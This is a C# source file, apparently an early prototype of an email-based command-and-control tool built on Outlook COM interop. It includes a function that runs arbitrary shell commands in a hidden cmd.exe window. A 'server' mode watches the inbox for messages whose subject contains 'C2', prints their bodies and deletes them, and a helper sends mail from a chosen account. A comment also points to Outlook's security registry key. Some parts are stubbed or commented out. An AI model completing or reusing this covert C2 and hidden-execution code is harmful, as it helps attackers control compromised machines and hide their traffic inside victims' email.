using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Threading;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Diagnostics;

namespace ExchangeExample
{
    public class Program
    {
        public static Outlook.NameSpace outlookNameSpace;
        public static Outlook.MAPIFolder inbox;
        public static Outlook.Items items;
        //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Wow6432Node\Microsoft\Office\16.0\Outlook\Security
        public static void ExecuteCommand(string command)
        {

            Process process = new Process();
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C "+ command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.Start();
            string q = "";
            while (!process.HasExited)
            {
                q += process.StandardOutput.ReadToEnd();
            }

            Console.WriteLine(q);
        }
        public static Outlook.Account GetAccountForEmailAddress(Outlook.Application application, string smtpAddress)
        {

            // Loop over the Accounts collection of the current Outlook session. 
            Outlook.Accounts accounts = application.Session.Accounts;
            foreach (Outlook.Account account in accounts)
            {
                // When the e-mail address matches, return the account. 
                if (account.SmtpAddress == smtpAddress)
                {
                    return account;
                }
            }
            throw new System.Exception(string.Format("No Account with SmtpAddress: {0} exists!", smtpAddress));
        }
        public static void SendEmailFromAccount(Outlook.Application application, string subject, string body, string to, string smtpAddress)
        {

            // Create a new MailItem and set the To, Subject, and Body properties. 
            Outlook.MailItem newMail = (Outlook.MailItem)application.CreateItem(Outlook.OlItemType.olMailItem);
            newMail.To = to;
            newMail.Subject = subject;
            newMail.Body = body;

            // Retrieve the account that has the specific SMTP address. 
            Outlook.Account account = GetAccountForEmailAddress(application, smtpAddress);
            // Use this account to send the e-mail. 
            newMail.SendUsingAccount = account;
            newMail.Send();
        }
        public static void Main(string[] args)
        {
            //ExecuteCommand("ipconfig");
            
            Outlook.Application OutlookApplication = Marshal.GetActiveObject("Outlook.Application") as Outlook.Application;
            outlookNameSpace = OutlookApplication.GetNamespace("MAPI");
            inbox = outlookNameSpace.GetDefaultFolder(
                    Microsoft.Office.Interop.Outlook.
                    OlDefaultFolders.olFolderInbox);
            //SendEmailFromAccount(OutlookApplication, "TEST", "ababa", "u8885555@bsmch.net", "u8885555@bsmch.net");

            if (args.Length == 0)
            {
                Console.WriteLine("Please enter arg server/client");
            }
            if (args[0] == "server")
            {
                items = inbox.Items;
                items.ItemAdd +=
                    new Outlook.ItemsEvents_ItemAddEventHandler(Server_Callback);
                Console.WriteLine("[!] Waiting for new messages:\n=============================");
            }

            
            while (true)
            {
                Thread.Sleep(1000000);
            }
        }

        public static void Server_Callback(object Item)
        {
            string filter = "C2";
            Outlook.MailItem mail = (Outlook.MailItem)Item;
            if (Item != null)
            {
                if (mail.Subject.ToUpper().Contains(filter.ToUpper()))
                {
                    Console.WriteLine("New Message from: {0}\tMessage: {1}",mail.SendUsingAccount.SmtpAddress,mail.Body.ToString());
                    mail.Delete();
                }
            }

        }

        public static void Client_Callback(object Item)
        {
            string filter = "C2";
            Outlook.MailItem mail = (Outlook.MailItem)Item;
            if (Item != null)
            {
                if (mail.Subject.ToUpper().Contains(filter.ToUpper()))
                {
                    Console.WriteLine("New Message from: {0}\tMessage: {1}", mail.SendUsingAccount.SmtpAddress, mail.Body.ToString());
                    mail.Delete();
                }
            }

        }
    }
}
